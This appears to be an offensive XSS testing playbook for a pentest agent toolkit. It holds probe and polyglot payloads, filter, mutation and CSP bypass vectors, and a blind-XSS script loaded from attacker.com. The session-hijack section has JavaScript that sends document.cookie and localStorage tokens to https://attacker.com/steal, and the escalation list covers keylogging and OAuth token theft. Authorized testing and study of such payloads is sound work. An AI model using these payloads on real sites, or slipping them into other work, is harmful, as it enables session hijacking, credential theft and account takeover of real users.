---
name: web-16-xss
sequence: web-16
category: xss
domain: web
description: "Cross-Site Scripting testing checklist: stored/reflected/DOM/blind XSS discovery, polyglot payloads, CSP bypass, XSS filter bypass, event handler injection, DOM clobbering, mutation XSS, and impact escalation (session hijack, phishing, keylogging). Use for web app XSS testing and bug bounty."
wordlist_ref: "wordlists/web/web-04-xss/"
---

# Cross-Site Scripting (XSS) — Web Offensive Methodology

## Quick Workflow

1. Identify all user input reflection points: form fields, URL params, headers, cookies, filename
2. Determine context: HTML body, HTML attribute, JavaScript string, CSS, URL
3. Inject polyglot/test payload — if executed, classify type (stored/reflected/DOM/blind)
4. Bypass filters/WAF/CSP with encoding, event handlers, or framework-specific vectors
5. Escalate impact: session hijack, phishing, keylogging, account takeover

---

## Detection

### Basic Probes

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"onmouseover="alert(1)
javascript:alert(1)
```

### Context-Specific

| Context | Vector | Payload |
|---------|--------|---------|
| HTML body | `<script>` tag | `<script>alert(1)</script>` |
| HTML attribute | Break attribute with `"` | `" onfocus="alert(1)" autofocus="` |
| JavaScript string | Break string with `'` | `'-alert(1)-'` |
| CSS value | Expression/url | `{expression: xss()}` |
| URL/href | `javascript:` | `javascript:alert(1)` |

### Types

| Type | Description | Detection |
|------|-------------|-----------|
| **Reflected** | Payload in request, immediately reflected in response | `?q=<script>alert(1)</script>` → rendered |
| **Stored** | Payload stored on server, served to other users | Submit as comment/profile → other users visit page |
| **DOM** | Payload processed client-side via JS | No server reflection, but DOM sink executes |
| **Blind** | Payload stored, triggers on admin/bot page | Use OOB callback: `<script src=http://attacker.com/x>`

---

## Framework-Specific Vectors

| Framework | Sink | Payload |
|-----------|------|---------|
| React | `dangerouslySetInnerHTML` | Object with `__html:` field |
| Vue | `v-html` | `<div v-html="payload">` |
| Angular (1.x) | `{{constructor.constructor()}}` | Sandbox escape via template expression |
| Angular (2+) | `[innerHTML]` binding | Requires `bypassSecurityTrustHtml` |
| Svelte | `{@html ...}` | Direct HTML interpolation |
| jQuery | `.html()` / `.append()` | HTML string injection |
| Next.js | Server Actions, RSC | Unvalidated input in edge runtime |

---

## Bypass Techniques

| Technique | Payload |
|-----------|---------|
| Polyglot | `jaVasCript:/*-/*`\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e` |
| Event handler | `<img src=x onerror=alert(1)>` |
| SVG | `<svg onload=alert(1)>` |
| Mutation XSS | `<noscript><p title="</noscript><img src onerror=alert(1)>">` |
| mXSS (Angular) | `<svg><style></style><img src onerror=alert(1)></svg>` |
| Unicode | `﹤img src=x onerror=alert(1)﹥` (fullwidth brackets) |
| DOMPurify bypass | Check CVE database for current bypasses |

---



## Hacker Mindset

**XSS is about context, not payload.** The same `<script>alert(1)</script>` will execute in HTML context but fail in JavaScript string context. Know your context: HTML body, attribute, JS string, CSS, URL.

**Blind XSS pays better than reflected.** Stored XSS that triggers in an admin dashboard is worth 10x more than a self-XSS on your own profile.

**CSP is not a defense, it's a bypass challenge.** Every CSP has a bypass — JSONP endpoints, Angular CDN, wildcard subdomains.



## Chaining & Escalation

### XSS → Session Hijack
```javascript
// Steal cookies
document.location='https://attacker.com/steal?c='+document.cookie

// Steal localStorage tokens
document.location='https://attacker.com/steal?token='+localStorage.getItem('token')
```



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed



## Tools

- Burp Suite (manual testing + Intruder)
- curl / httpx
- Nuclei templates
- XSS Hunter
- Dalfox

## Wordlist Invocation

```bash
bash agents/invoke.confirm.sh https://target.com q
bash agents/invoke.parameters.sh https://target.com
bash agents/invoke.payloads.sh https://target.com q low
bash agents/invoke.payloads.sh https://target.com q med
bash agents/invoke.payloads.sh https://target.com q high
```

---

## Chaining

- **XSS → Session hijack**: `document.cookie` → send to attacker server
- **XSS → CSRF**: forge authenticated requests via `fetch()` or `XMLHttpRequest`
- **XSS → Keylogging**: capture keystrokes to steal passwords/2FA codes
- **XSS → OAuth token theft**: read `localStorage` or URL fragment for OAuth tokens
- **DOM clobbering**: overwrite `window.*` to modify script behavior

---

## Key References

- PortSwigger XSS cheat sheet
- OWASP XSS Prevention Cheat Sheet
- MITRE ATT&CK T1059.007 (JavaScript)
